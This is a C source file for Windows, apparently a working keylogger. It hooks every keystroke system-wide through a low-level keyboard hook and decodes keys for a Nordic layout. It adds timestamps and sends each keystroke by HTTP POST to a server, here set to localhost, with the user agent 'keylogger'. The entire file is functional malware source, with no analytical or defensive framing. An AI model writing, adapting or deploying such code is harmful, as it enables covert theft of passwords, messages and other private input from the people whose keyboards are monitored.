#include <stdio.h>
#include <stdbool.h>
#include <stdint.h>
#include <windows.h>
#include <winhttp.h>

#define LOWERCASE_OFFSET 32
#define SYM_DELETE (-1)
#define SYM_BACKSPACE (-2)
#define SYM_ENTER (-3)

HINTERNET session;
HINTERNET connection;

void getTimestamp(char* str) {
    SYSTEMTIME time;
    GetSystemTime(&time);
    sprintf(str, "\n[%02d:%02d:%02d]", time.wHour, time.wMinute, time.wSecond);
}

bool CAPSLOCK() {
    return GetKeyState(VK_CAPITAL);
}

bool SHIFT() {
    return GetAsyncKeyState(VK_SHIFT);
}

bool ALT() {
    return GetAsyncKeyState(VK_MENU);
}

bool CTRL() {
    return GetAsyncKeyState(VK_CONTROL);
}

bool CTRL_ALT() {
    return CTRL() && ALT();
}

int numKeySymbol(const char symbols[3]) {
    if(SHIFT()) return symbols[1];
    if(CTRL_ALT()) return symbols[2];
    return symbols[0];
}

int misc2KeySymbol(const char symbols[2]) {
    if(SHIFT()) return symbols[1];
    return symbols[0];
}

int misc3KeySymbol(const char symbols[3]) {
    if(SHIFT()) return symbols[1];
    if(CTRL_ALT()) return symbols[2];
    return symbols[0];
}


void sendPacket(char* body) {

    HINTERNET request = WinHttpOpenRequest(connection, L"POST", L"/", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (request == NULL) return;

    size_t contentLength = strlen(body)+1;
    bool success = WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0, body, contentLength, contentLength, 0); // return value ignored
    if (!success) return;
    WinHttpReceiveResponse(request, NULL); // dont care about response

    WinHttpCloseHandle(request);
}


void handleTimestamp(uint32_t ksTime, char* body) {
    static uint32_t previousKeystrokeTime = 0;
    if(ksTime - previousKeystrokeTime > 30000) { // more than 30 seconds passed since last keystroke: log time
        char timestamp[12];
        getTimestamp(timestamp);
        strcat(body, timestamp);
    }
    previousKeystrokeTime = ksTime;
}


LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {

    static const char numSymbols[10][3] = {
        {'0', '=', '}'},
        {'1', '!', 0},
        {'2', '\"', '@'},
        {'3', '#', '\x9C'}, // £
        {'4', '\xCF', '$'}, // ¤
        {'5', '%', '\xD5'}, // €
        {'6', '&', 0},
        {'7', '/', '{'},
        {'8', '(', '['},
        {'9', ')', ']'}
    };

    static const char OEM_2Symbols[9][2] = {
        {'+', '?'},
        {',', ';'},
        {'-', '_'},
        {'.', ':'},
        {'\'', '*'},
        {'\x91', '\x92'}, // æ, Æ
        {'\xAB', '\xF5'}, // ½, §
        {'\x86', '\x8F'}, // å, Å
        {'\x9B', '\x9D'}  // ø, Ø
    };

    static const char OEM_3Symbols[4][3] = {
        {'\xF9', '^', '~'}, // ¨
        {'\xEF', '`', '|'}, // ´
        {'<', '>', '\\'}
    };

    // prevents transferring to next input (for some reason)
    GetAsyncKeyState(VK_SHIFT);
    GetAsyncKeyState(VK_CONTROL);

    if (nCode < 0 || (wParam != WM_KEYDOWN && wParam != WM_SYSKEYDOWN)) goto nextHook;

    char body[32] = {0};
    int symbol = 0;
    KBDLLHOOKSTRUCT* kbEvent = (KBDLLHOOKSTRUCT*)lParam;
    switch (kbEvent->vkCode) {

        case '0' ... '9': {
            if(CTRL() && !ALT()) break;
            symbol = numKeySymbol(numSymbols[kbEvent->vkCode - '0']);
        } break;

        case 'A' ... 'Z': {
            if(CTRL()) break;
            symbol = (int)kbEvent->vkCode + (SHIFT() || CAPSLOCK() ? 0 : LOWERCASE_OFFSET);
        } break;

        case VK_OEM_PLUS:
        case VK_OEM_COMMA:
        case VK_OEM_MINUS:
        case VK_OEM_PERIOD:
        case VK_OEM_2:
        case VK_OEM_3:
        case VK_OEM_5:
        case VK_OEM_6:
        case VK_OEM_7: {
            if(CTRL() || ALT()) break;
            switch (kbEvent->vkCode) {
                case VK_OEM_5:
                case VK_OEM_6:
                case VK_OEM_7: symbol = misc2KeySymbol(OEM_2Symbols[kbEvent->vkCode - VK_OEM_5 + 6]); break;
                default: symbol = misc2KeySymbol(OEM_2Symbols[kbEvent->vkCode - VK_OEM_PLUS]); break;
            }
        } break;

        case VK_OEM_1:
        case VK_OEM_4:
        case VK_OEM_102: {
            if((CTRL() && !ALT()) || (ALT() && !SHIFT() && !CTRL())) break;
            switch(kbEvent->vkCode) {
                case VK_OEM_1:   symbol = misc3KeySymbol(OEM_3Symbols[0]); break;
                case VK_OEM_4:   symbol = misc3KeySymbol(OEM_3Symbols[1]); break;
                case VK_OEM_102: symbol = misc3KeySymbol(OEM_3Symbols[2]); break;
                default: __builtin_unreachable();
            }
        } break;

        case VK_SPACE: {
            if(CTRL() || ALT()) break;
            symbol = ' ';
        } break;
        case VK_RETURN: {
            if(ALT()) break;
            symbol = SYM_ENTER;
        } break;
        case VK_BACK: {
            symbol = SYM_BACKSPACE;
        } break;
        case VK_DELETE: {
            if(ALT() || SHIFT()) break;
            symbol = SYM_DELETE;
        } break;

        default: break;
    }

    if (symbol) {
        handleTimestamp(kbEvent->time, body);
        switch(symbol) {
            case SYM_BACKSPACE: strcat(body, "[BS]"); break;
            case SYM_DELETE: strcat(body, "[DEL]"); break;
            case SYM_ENTER: strcat(body, "[RET]"); break;
            default: sprintf(body, "%s%c", body, symbol); break;
        }
        // format package instead of this:
        sendPacket(body);
        printf("%s", body);
    }

    nextHook:
    return CallNextHookEx(0, nCode, wParam, lParam);
}


int main(void) {

    const int allThreads = 0;
    HHOOK hook = SetWindowsHookExA(WH_KEYBOARD_LL, &LowLevelKeyboardProc, NULL, allThreads);
    if (hook == NULL) exit(EXIT_FAILURE);

    session = WinHttpOpen(L"keylogger", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, WINHTTP_FLAG_ASYNC);
    if (session == NULL) {
        printf("\nUnable to start session\n");
        exit(EXIT_FAILURE);
    }
    connection = WinHttpConnect(session, L"localhost", INTERNET_DEFAULT_PORT, 0);
    if (connection == NULL) {
        printf("\nUnable to open connection\n");
        exit(EXIT_FAILURE);
    }

    while (true) {
        SendMessageA(HWND_BROADCAST, WM_CHAR, 0, 0);
    }

    // unreachable anyway
    UnhookWindowsHookEx(hook);
    WinHttpCloseHandle(session);
    WinHttpCloseHandle(connection);

    return 0;
}